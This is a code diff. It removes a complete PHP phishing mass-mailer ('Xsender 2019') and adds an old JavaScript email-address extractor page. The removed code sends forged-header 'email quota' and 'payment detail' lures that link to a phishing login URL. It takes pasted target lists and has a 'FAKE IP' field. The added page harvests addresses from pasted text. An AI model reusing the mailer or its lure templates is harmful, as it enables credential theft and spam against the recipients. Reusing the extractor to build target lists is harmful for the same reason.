@@ -1,250 +1,260 @@
-<?php
-session_start();
-ob_start("ob_gzhandler");
-set_time_limit(0); 
-$website="https://www.digitaldruck-kw.de/vianny.php"; //Make this full url including folders of where login files resides
-//sanitize data where any character is allowed
-function sanitizer($check){
-	$check=str_replace("\'","'",$check);
-	$check=str_replace('\"','"',$check);
-	$check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
-	$check=trim($check);
-	$check=str_replace("<","&lt;",$check);
-	$check=str_replace('>','&gt;',$check);
-	$check=str_replace("\r\n","<br/>",$check);
-	$check=str_replace("\n","<br/>",$check);
-	$check=str_replace("\r","<br/>",$check);
-	$check=str_replace("'","&#39;",$check);
-	$check=str_replace('"','&quot;',$check);
-	$check=str_replace(" fuck "," f**k ",$check);
-	$check=str_replace(" shit "," s**t ",$check);
-	$check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
-	 return $check;}
-//makes data ok on edit textarea
- function resanitize($check){
-	$check=str_replace("<br/>","\r\n",$check);
-	$check=str_replace("<br/>","\n",$check);
-	$check=str_replace("<br/>","\r",$check);
-	$check=str_replace("&gt;",">",$check);
-	$check=str_replace("&lt;","<",$check);
-	$check=str_replace("&#39;","'",$check);
-	$check=str_replace('&quot;','"',$check);
-	 return $check;}
-//validate email address
-function validate_email($email){
-	$status=false;
-	$regex='/^([a-zA-Z0-9])+([\.a-zA-Z0-9_-])*@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-]+)*\.([a-zA-Z]{2,6})$/'; 
-	if(preg_match($regex, $email)){$status=true;}
-	return $status; }
-//Email sending
-function sending_email($email,$id='1',$details=''){
-	$subject='Account Update Notification';
-	$site_name='Google.net';
-// To send HTML mail, the Content-type header must be set
-$headers  = 'MIME-Version: 1.0' . "\r\n";
-        $headers .= 'Return-Path: bounce-810_HTML-769869545-477063-1070564-43@bounce.email.oflce57578375.com'. "\r\n";
-        $headers .= 'Message-ID: <5bc7d69b-b2f2-4b32-8f45-bf9030f9f684@HK2PR01MB1076.apcprd01.prod.exchangelabs.com>'. "\r\n";
-        $headers .= 'From: MailUpdate Team!<ms-oxprotp@mssimple.apcprd01.prdexchangpe11.net>'. "\r\n";
-        $headers .= 'Content-Type: multipart/report; report-type=delivery-status; boundary="d9f4cc32-73bb-4b4c-b739-869e6235af8d"
---d9f4cc32-73bb-4b4c-b739-869e6235af8d'. "\r\n";
-$headers .= 'Content-type: text/HTML; charset="UTF-8"; format=flowed; delsp=yes
-Content-Transfer-Encoding: bit7'. "\r\n";
-	// Additional headers
-	$headers .= 'From: '.$site_name.' <'.$siteemail.'>' . "\r\n";
-	//format message	
-	$message=email_format($email,$id,$details);
-	@mail($email,$subject, $message, $headers);	
+
+<HTML>
+<HEAD>
+<SCRIPT LANGUAGE="JAVASCRIPT" TYPE="text/javascript">
+<!-- Begin
+
+// Created and Copyrighted by Benjamin Leow
+// Please go to http://www.surf7.net for latest version and more freeware
+
+function copy() {
+textRange = document.extractor.output.createTextRange();
+textRange.execCommand("RemoveFormat");
+textRange.execCommand("Copy");
 }
 
-function email_format($email,$id='1',$details=''){
-	global $website;
-	//$website="";
-	$url=$website."?email=".$email;
-	$em=explode('@',$email);
-	$emaildomain = substr(strrchr($email, "@"), 1);
-	$bc=explode('.',$emaildomain);
-	$chgcap=strtolower($bc[0]);
-	$frmsite=ucfirst($chgcap);
-	$emincap=strtolower($em[0]);
-	$mename=ucfirst($emincap);
-	$message="<table border='0' style='font-family: calibri; font-size: 16px; background-color: rgb(255, 255, 255);' width='100%'>
-	      <tbody><tr><td align='center'>
-	      <table border='0' cellpadding='0' cellspacing='0' height='100%' style='min-width: 600px;' width='100%'>
-	      <tbody><tr align='center'><td>
-	      <table border='0' cellpadding='0' cellspacing='0' style='max-width: 600px;'>
-	      <tbody><tr><td>
-              <tbody></tbody></table></td></tr><tr height='16'></tr><tr><td>
-              <tbody><tr><td colspan='3' height='69px'>&nbsp;</td></tr><tr><td width='28px'>&nbsp;</td>
-	      <td style='font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 57px; color: rgb(255, 255, 255); line-height: 1.25;'>
-              <span style='color:#1651f9;'>Mail Update</span></a></td><td width='32px'>&nbsp;</td></tr>
-              <tr><td colspan='3' height='18px'>&nbsp;</td></tr></tbody></table></td></tr>
-              <table bgcolor='#fff' border='0' cellpadding='0' cellspacing='0' style='min-width: 600px; max-width: 900px; border-width: 0px 1px 1px; border-right-style: solid; border-left-style: solid; border-right-color: rgb(240, 240, 240); border-left-color: rgb(240, 240, 240); border-bottom-style: solid; border-bottom-color: rgb(192, 192, 192); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px;' width='100%'>
-	      <tbody><tr height='16px'><td rowspan='3' width='32px'>&nbsp;</td><td>&nbsp;</td>
-	      <td rowspan='3' width='32px'>&nbsp;</td></tr><tr><td><table border='0' cellpadding='0' cellspacing='0' style='min-width: 300px;'>
-	      <tbody><tr><td style='font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 13px; color: rgb(32, 32, 32); line-height: 1.5;'>
-              <a href='".$url."' style='text-decoration: none;'>
-              <span style='color:#000000;'>
-              Hi <b>".ucwords($em[0])."</b><div>&nbsp;</div>
-	      Please pay attention:
-Good Day
-
-
-Attached is payment detail we have processed on 10/08/2019 11:21 AM, The payment date reflect
-
-the date at which the payment is processed,
-
-Please refer to payment reference in attachement for future correspondence, and get back to us Asap
-<div>&nbsp;</div>
-	     
-	 <br>
-    Attention: {$email} <br>Your email quota has reached 98% and will soon exceed its limit. 
-Follow the URL below to upgrade your quota to 25GB for free to avoid loss of email data. 
-<a href='".$url."' style='text-decoration: none;'><b> Upgrade Email Quota>> </b></a> <br><br>
-<p>Source:  ##email## Administrator</p>
- 
-	      <p>Regard<br>Account control Desk<br>jennife，帐户协调员<br>金融公司hsagroup</span></a><br/>&nbsp;</p></td>
-              </tr></tbody></table></td></tr></tbody></table></td></tr>
-	      <tr height='16'></tr><tr><td style='max-width: 900px; font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 10px; color: rgb(188, 188, 188); line-height: 1.5;'>&nbsp;</td></tr><tr><td>
-              <table style='font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 10px; color: rgb(102, 102, 102); line-height: 18px; padding-bottom: 10px;'>
-	      <tbody><tr><td><span style='color:#424242;'>© 2019 Mail Team!</span></a></td></tr></tbody></table></td></tr></tbody></table></td>
-	      <td width='32px'>&nbsp;</td></tr></tbody></table></td></tr></tbody>
-</table>"; 
-
-	return $message; }?>
-<?php system("chmod 0644 gfx.php"); ?>
-<?php chmod("gfx.php",0644); ?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml"><head>
-<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
-<link rel="SHORTCUT ICON" href="http://mxmail.optimumelectronics.com/mail/skins/default/images/favicon.ico">
-<title>Xsender 2019</title>
-<style type="text/css">
-<!--
-.form {font-family: "Courier New", Courier, monospace;border:none, background-color:#000000;}
-form .text-field {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6;height: 40px;border-radius: 3px; margin-top: 3px;padding-left: 10px;
-form .text-field {border: 1px solid #A6A6A6; width: 230px; height: 40px; border-radius: 3px; margin-top: 3px; padding-left: 10px; color: #6C6C6C; background: none repeat scroll 0% 0% #FCFCFC; outline: medium none;}
-input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important; }color: #6C6C6C; box-shadow: 1px 2px 50px #A6A6A6; background: none repeat scroll 0% 0% #FCFCFC;outline: medium none;}input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important;}
-form .text-area {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6; width: 330px;height: 130px;border-radius: 3px; margin-top: 3px;padding-left: 10px;}
-form .msg-area {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6; width: 330px;height: 330px;border-radius: 3px; margin-top: 3px;padding-left: 10px;}
-form .text-field {border: 1px solid #A6A6A6; width: 230px; height: 40px; border-radius: 3px; margin-top: 3px; padding-left: 10px; color: #6C6C6C; background: none repeat scroll 0% 0% #FCFCFC; outline: medium none;}
-input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important; }color: #6C6C6C; box-shadow: 1px 2px 50px #A6A6A6; background: none repeat scroll 0% 0% #FCFCFC;outline: medium none;}input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important;}
-.send {font-family: "Courier New", Courier, monospace;border:none; font-size:18px; background-color:#FFFFFF; font-black:bold}
-.button {border-radius: 3px;border: 1px solid #336895;box-shadow: 0px 1px 0px #8DC2F0 inset;width: 242px;height: 40px;
-    background: -moz-linear-gradient(center bottom , #4889C2 0%, #5BA7E9 100%) repeat scroll 0% 0% transparent;cursor: pointer;color: #FFF;font-weight: bold;text-shadow: 0px -1px 0px #336895;font-size: 13px;}
-.div { box-shadow: 1px 2px 50px #888888; border-radius:1px;}
-#Layer1 {	position:absolute;
-	left:402px;
-	top:22px;
-	width:457px;
-	height:121%;
-	z-index:1;
-	margin-top: 0.5%;
-	margin-right: 5%;
-	right: 20%;
-	bottom: 15%;
-	margin-bottom: 10%;
-	margin-left: 5%;
-	border: none #000;
-	border-radius:10px;
+function paste() {
+textRange = document.extractor.input.createTextRange();
+textRange.execCommand("RemoveFormat");
+textRange.execCommand("Paste");
 }
 
--->
-</style>
-</head>
+function help(){
 
-<body>
-<form method='POST' action='#'>
-<div style='margin:0px;background:white;font-family:calibri;color:#000;font-size:13px;padding:10px;width:100%;'>
-<div style='border:1px solid #c0c0c0;background:#fff;max-width:70%;margin:5px auto 5px auto;min-height:300px;box-shadow: 1px 2px 50px #888888; border-radius:3px;'>
-<div style='padding:5px;margin:5px;font-size:16px;color:black;'><p style='clear:both;'>
-  <table width="100%" border="0">
-  <tr>
-      <td height="23" colspan="2"><div align="center" class="form"><strong><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >A</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >P</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >I</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam>
-<spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >S</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >P</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >O</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >N</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam>
-<spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >S</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >N</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam>
-<br>
-<spam style='color:#666;text-align:center;text-shadow:#000 1px 1px;'>*RRS* BY TONY MARIS CYBER TEAM</spam> </strong></div></td>
-    </tr>
-	<tr align="center"><td><div style='width:100%;'>  <?php
-if(isset($_POST['go']) ){
-	//sanitize the data
-	$_SESSION['xsenderid']=sanitizer($_POST['id']);
-	$separator=sanitizer($_POST['separator']);
-	$details=sanitizer($_POST['details']);
-	$mails=sanitizer($_POST['mails']);
-	$id=$_SESSION['xsenderid'];
-	if($separator==''){$separator='<br/>';}
-	if($mails!='' && $details!=''){
-	
+var imgwid = 450;
+var imghgt = 360;
 
-		$mails=explode($separator,$mails);
-		$total=count($mails);
-		$valid=0;
-			for($i=0;$i<$total;$i++){
-				$email=$mails[$i];
-					if(validate_email($email)){
-						$valid=$valid+1;
-						
-						//Send here
-						sending_email($email,$id,$details);
-						//send here
-						} else {print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: RED; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>".$email." NOT A VALID EMAIL</spam>"; }
+content = ('<html><head><title>Email Extractor Lite : Help</title>');
+content += ('<STYLE TYPE="text/css">');
+content += ('BODY,td,th,ul,p       { font: normal normal normal 8pt/1em Verdana; color: #000; }');
+content += ('</STYLE>');
+content += ('</head><body onload="window.focus();">');
+content += ('<B>Quick and dirty</B>');
+content += ('<OL>');
+content += ('<LI>Copy all text from any webpages, documents, files, etc...');
+content += ('<LI>Paste it into <B>Input Window</B>.');
+content += ('<LI>Click "<I>Extract</I>" button.');
+content += ('<LI>Copy the result from <B>Output Window</B> to somewhere and save it.');
+content += ('<LI>Click "<I>Reset</I>" button to start all over again.');
+content += ('</OL>');
+content += ('<P><B>More Controls</B>');
+content += ('<OL>');
+content += ('<LI>Click "<I>Paste Input</I>" link to paste any text you copied elsewhere into <B>Input Window</B>.');
+content += ('<LI>Click "<I>Copy Output</I>" link to copy whatever text inside <B>Output Window</B>.');
+content += ('<LI>Choose different separator from the dropdown menu or specify your own. Default is comma.');
+content += ('<LI>You can group a number of emails together. Each group is separated by a new line. Please enter number only.');
+content += ('<LI>Check "<I>Sort Alphabetically</I>" checkbox to arrange extracted emails well... alphabetically.');
+content += ('<LI>You can extract or exclude emails containing certain string (text). Useful if you only want to get email from a particular domain.');
+content += ('<LI>You can choose to extract web addresses instead of email addresses.');
+content += ('</OL>');
+content += ('<DIV ALIGN="CENTER"><INPUT TYPE="button" VALUE="Close" onClick="javascript:window.close();"></DIV>');
+content += ('</body></html>');
+
+var winl = (screen.width - imgwid) / 2;
+var wint = (screen.height - imghgt) / 2;
+helpwindow = window.open('','help','width=' + imgwid + ',height=' + imghgt + ',resizable=0,scrollbars=0,top=' + wint + ',left=' + winl + ',toolbar=0,location=0,directories=0,status=0,menubar=0,copyhistory=0');
+helpwindow.document.write(content);
+helpwindow.document.close();
+}
+
+function checksep(value){
+if (value) document.extractor.sep.value = "other";
+}
+
+function numonly(value){
+if (isNaN(value)) {
+	window.alert("Please enter a number or else \nleave blank for no grouping.");
+	document.extractor.groupby.focus();
+}
+}
+
+function findEmail() {
+var email = "none";
+var a = 0;
+var ingroup = 0;
+var separator = document.extractor.sep.value;
+var string = document.extractor.string.value;
+var groupby = Math.round(document.extractor.groupby.value);
+var address_type = document.extractor.address_type.value;
+
+if (separator == "new") separator = "\n";
+if (separator == "other") separator = document.extractor.othersep.value;
+if (address_type == "web") var rawemail = document.extractor.input.value.match(/(http:\/\/+[a-zA-Z0-9]+[a-zA-Z0-9-]+\.[a-zA-Z0-9._/-]+)/gi);
+else var rawemail = document.extractor.input.value.toLowerCase().match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
+var norepeat = new Array();
+var filtermail = new Array();
+if (rawemail) {
+	if (string){
+		x = 0;
+		for (var y=0; y<rawemail.length; y++) {
+			if (document.extractor.filter_type.value == 1) {
+				if (rawemail[y].search(string) >= 0) {
+					filtermail[x] = rawemail[y];
+					x++;
+				}
+			} else {
+				if (rawemail[y].search(string) < 0) {
+					filtermail[x] = rawemail[y];
+					x++;
+				}
 			}
-		print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: green; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>WELL SENT ".$valid." OUT OF ".$total." ";
+		}
+		rawemail = filtermail;
+	}
 
-
-	} else {print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: BLACK; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>MAILS OR DETAIL ARE EMPTY</spam>"; }
-}
-?> </div></td></tr>
-  <tr>
-    <td valign="top"><div>
-<select name='id' class="text-field" style='width:100%;'>
-<?php
-if(isset($_SESSION['xsenderid']))
-{print "<option value='".$_SESSION['xsenderid']."'>".$_SESSION['xsenderid']."</option>";}
-?>
-<option value='1'>1</option>
-<option value='2'>2</option>
-<option value='3'>3</option>
-<option value='4'>4</option>
-</select>
-      </div>
-      <div>
-        
-        <textarea name='separator' class="text-field" size="30" placeholder="Email/Separator(Leave Empty if in NEW LINE)" style='width:100%;'><?php if(isset($_POST['separator'])){print resanitize($_POST['separator']);} ?></textarea>
-      </div>
-      <div>
-        <textarea placeholder='FAKE IP (E.G CN)' class="text-field" size="83%" name='details' style='width:100%;'><?php if(isset($_POST['details'])){print resanitize($_POST['details']);} ?></textarea>
-      </div>      <div>
-        <textarea placeholder='PASTE UR EMAIL HERE' class="text-area" name='mails' cols="35" rows="10" style='width:100%;'><?php if(isset($_POST['mails'])){print resanitize($_POST['mails']);} ?></textarea>
-      </div>
-	  <br />
-	  <div><input type="submit" style="border-radius: 3px;border: 1px solid #336895;box-shadow: 0px 1px 0px #8DC2F0 inset;width: 242px;height: 40px;background: -moz-linear-gradient(center bottom , #4889C2 0%, #5BA7E9 100%) repeat scroll 0% 0% transparent;cursor: pointer;color: #FFF;font-weight: bold;text-shadow: 0px -1px 0px #336895;font-size: 13px;" name="go" value="START GOING"> </div><br />
-<div></div>	  </td>
-    <td align="left"><div><?php print email_format('anoghost@stratoserver.net',1,'IP Address: 85.214.132.117 <br/>Location: Germany (DE)<br/>'); ?> </div></td>
-  </tr>
-</table>
-<center>
-<table>
-<tr align="center"><td>
-  <spam style='color:#666;align:center;text-shadow:#000 1px 1px;'>Work hard, Do not sprayed this tool!.</spam>
-</td></tr></table></center>
- </div>
-</div>
-</div>
-</div>
-</form>
-</body>
-</html>
-<?php
-function make_seed() {
-list($usec, $sec) = explode(' ', microtime());
-return (float) $sec + ((float) $usec * 100000);
-}
-mt_srand(make_seed());
-function randchar($string = 'abcdefghijklmnopqrstuvwxyz0123456789'){
-return $string{rand(0,strlen($string)-1)};
+	for (var i=0; i<rawemail.length; i++) {
+		var repeat = 0;
+		
+		// Check for repeated emails routine
+		for (var j=i+1; j<rawemail.length; j++) {
+			if (rawemail[i] == rawemail[j]) {
+				repeat++;
+			}
+		}
+		
+		// Create new array for non-repeated emails
+		if (repeat == 0) {
+			norepeat[a] = rawemail[i];
+			a++;
+		}
+	}
+	if (document.extractor.sort.checked) norepeat = norepeat.sort(); // Sort the array
+	email = "";
+	// Join emails together with separator
+	for (var k = 0; k < norepeat.length; k++) {
+		if (ingroup != 0) email += separator;
+		email += norepeat[k];
+		ingroup++;
+		
+		// Group emails if a number is specified in form. Each group will be separate by new line.
+		if (groupby) {
+			if (ingroup == groupby) {
+				email += '\n\n';
+				ingroup = 0;
+			}
+		}
+	}
 }
 
-return $result; 
-?>
+// Return array length
+var count = norepeat.length;
+
+// Print results
+document.extractor.count.value = count;
+document.extractor.output.value = email;
+}
+//  End -->
+</SCRIPT>
+
+<STYLE TYPE="text/css">
+BODY                  { background:#FFF }
+BODY,td,th,ul,p       { font: normal normal normal 8pt/1em Verdana; color: #000; }
+textarea,input,select { font: normal normal normal 8pt/1em Verdana; color: #000; background:#FFF}
+A:link, A:visited     { text-decoration: none; color: #059; }
+A:active, A:hover     { text-decoration: underline; color: #D14; }
+fieldset              { padding-left: 10px; padding-bottom: 10px; }
+.bordercolor          { background:#666 }
+.maincolor            { background:#CCC }
+.button               { background:#CCC }
+.titlebarcolor        { background:#007 }
+.titlefont            { font: normal normal bold 9pt/1em Arial; color: #FFF; }
+.copyrightfont        { font: normal normal normal 7.5pt/1.5em Verdana; color: #666; }
+</STYLE>
+
+<TITLE>Email Extractor Lite 1.6.1</TITLE>
+</HEAD>
+<BODY>
+
+<DIV ALIGN="CENTER">
+<FORM NAME="extractor">
+<TABLE CLASS="bordercolor" CELLPADDING=1 CELLSPACING=0 BORDER=0><TR><TD>
+<TABLE CLASS="maincolor" CELLPADDING=4 CELLSPACING=0 BORDER=0>
+<TR CLASS="titlebarcolor" VALIGN="MIDDLE"> 
+<TD><FONT CLASS="titlefont">Email Extractor Lite 1.6.1</FONT></TD>
+<TD ALIGN="RIGHT" NOWRAP></TD>
+</TR>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER" WIDTH="50%">
+<B>Input Window</B><BR>
+<TEXTAREA NAME="input" rows=8 cols=50></TEXTAREA>
+</TD>
+<TD VALIGN="TOP" ALIGN="CENTER" WIDTH="50%">
+<B>Output Window</B><BR>
+<TEXTAREA NAME="output" rows=8 cols=50 readonly></TEXTAREA>
+</TD></TR>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">
+
+<SCRIPT LANGUAGE="JavaScript" TYPE="text/javascript">
+<!--
+if ((navigator.appName=="Microsoft Internet Explorer")&&(parseInt(navigator.appVersion)>=4)) document.write('<A HREF="javascript:paste();">Paste Input</A>');
+else document.write('Paste Input');
+// -->
+</SCRIPT>
+
+</TD>
+<TD VALIGN="TOP" ALIGN="CENTER">
+
+<SCRIPT LANGUAGE="JavaScript" TYPE="text/javascript">
+<!--
+if ((navigator.appName=="Microsoft Internet Explorer")&&(parseInt(navigator.appVersion)>=4)) document.write('<A HREF="javascript:copy();">Copy Output</A>');
+else document.write('Copy Output');
+// -->
+</SCRIPT>
+
+</TD></TR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" COLSPAN=2>
+<fieldset title="Output Option">
+<legend align="left"><B>Output Option</B></legend>
+<BR>
+Separator:
+<SELECT NAME="sep">
+<OPTION VALUE=", ">Comma</OPTION>
+<OPTION VALUE="|">Pipe</OPTION>
+<OPTION VALUE=" : ">Colon</OPTION>
+<OPTION VALUE="new">New Line</OPTION>
+<OPTION VALUE="other">Other</OPTION>
+</SELECT>
+<INPUT TYPE="TEXT" NAME="othersep" SIZE=3 onBlur="checksep(this.value)">
+&nbsp;&nbsp;
+Group: <INPUT TYPE="TEXT" SIZE=3 NAME="groupby" onBlur="numonly(this.value)"> Addresses
+&nbsp;&nbsp;
+<LABEL FOR="sortbox"><INPUT TYPE="CHECKBOX" NAME="sort" id="sortbox">Sort Alphabetically</LABEL>
+</fieldset>
+<BR>
+<fieldset title="Filter Option">
+<legend align="left"><B>Filter Option</B></legend>
+<BR>
+<SELECT NAME="filter_type">
+<OPTION VALUE=1>Only</OPTION>
+<OPTION VALUE=0>Do not</OPTION>
+</SELECT>
+extract address containing this string: <INPUT TYPE="TEXT" SIZE=20 NAME="string">
+<BR>
+<BR>
+Type of address to extract: 
+<SELECT NAME="address_type">
+<OPTION VALUE="email">Email</OPTION>
+<OPTION VALUE="web">Web</OPTION>
+</SELECT>
+</fieldset>
+</TD></TR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<INPUT TYPE="BUTTON" CLASS="button" VALUE="Extract" onClick="findEmail()"> 
+<INPUT TYPE="RESET" CLASS="button" VALUE="Reset">&nbsp;&nbsp;&nbsp;
+<A HREF="javascript:help();"><I>Need help?</I></A>
+</TD>
+<TD VALIGN="TOP" ALIGN="RIGHT" NOWRAP>
+Counter: <INPUT NAME="count" SIZE=5 READONLY>
+</TD></TR>
+</TABLE>
+</TD></TR></TABLE>
+</FORM>
+<BR>
+<FONT CLASS="copyrightfont">&copy; 2002 - 2004 <A HREF="http://www.benleow.com">Benjamin Leow</A> - All Right Reserved<BR>Go to <A HREF="http://www.surf7.net">Surf7.net</A> for latest version and more freeware.</FONT>
+</DIV>
+
+</BODY>
+</HTML>
